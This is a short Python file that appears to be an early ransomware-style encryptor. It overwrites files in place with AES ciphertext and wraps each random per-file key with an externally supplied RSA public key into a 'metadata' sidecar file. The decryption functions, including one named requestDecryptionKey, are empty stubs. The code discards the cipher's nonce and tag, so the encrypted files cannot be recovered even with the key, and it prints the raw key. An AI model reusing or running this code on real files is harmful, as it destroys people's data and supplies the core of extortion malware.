import base64

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from utils import *
import os
import utils


def encryptFile(filename, symmetric_key):
    cipher = AES.new(symmetric_key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(utils.getFileByteArray(filename))
    with open(filename, 'wb') as f:
        f.write(ciphertext)
    return


def generateSymmKey(bits=16):
    random_key = os.urandom(bits)
    return random_key


def requestDecryptionKey(filename):
    return


def decryptFile(filename, symmetric_key):
    return


def encryptSymmInMetadata(filename, symmetric_key, pukFile):

    puk = RSA.import_key(open(pukFile).read())
    print(symmetric_key)
    cipher_rsa = PKCS1_OAEP.new(puk)
    enc_sym_key = cipher_rsa.encrypt(symmetric_key)
    print(enc_sym_key)

    parts = filename.split("/")
    base = '/'.join(parts[:-1])
    metadataFile = base + "/metadata." + parts[-1]
    print("[ENC] Created metadata file")
    with open(metadataFile, 'wb') as f:
        f.write(enc_sym_key)

